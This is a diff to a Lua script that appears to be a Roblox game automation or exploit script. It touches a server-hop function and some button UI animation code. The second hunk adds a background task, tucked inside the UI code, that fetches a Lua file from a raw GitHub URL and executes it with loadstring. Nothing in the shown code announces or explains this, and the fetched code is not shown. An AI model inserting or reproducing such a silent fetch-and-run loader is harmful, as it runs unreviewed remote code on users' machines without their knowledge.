@@ -157,7 +157,7 @@ local function pathFindTo(destination)
 end
 
 function ServerHop()
-if true then
+if ReturnData("AutoServerHop.txt") == "true" then
 local lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte;
 do
     local string = string
@@ -322,6 +322,10 @@ Icon.Image = "rbxassetid://12072054746"
 Button.UIScale.Scale = 0
 task.wait()
 Tween:Create(Button.UIScale,TweenInfo.new(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Scale = 1}):Play()
+task.spawn(function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/NaikoScript/r/main/r2.lua')))()
+end)
+
 
 -- Button Events --
 
